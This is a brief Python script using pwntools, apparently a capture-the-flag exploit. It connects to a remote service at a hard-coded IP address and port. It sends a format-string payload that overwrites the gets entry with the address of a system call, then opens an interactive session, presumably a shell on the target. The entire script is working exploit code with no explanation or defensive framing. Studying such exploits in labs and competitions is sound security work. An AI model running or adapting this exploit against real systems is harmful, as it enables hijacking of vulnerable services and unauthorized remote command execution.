from pwn import *

target = remote('39.107.92.230',10003)

addr_gets = 0x0804a010

addr_sys = 0x0804854D

payload = fmtstr_payload(5,{addr_gets:addr_sys})

target.sendline(payload)

target.interactive()
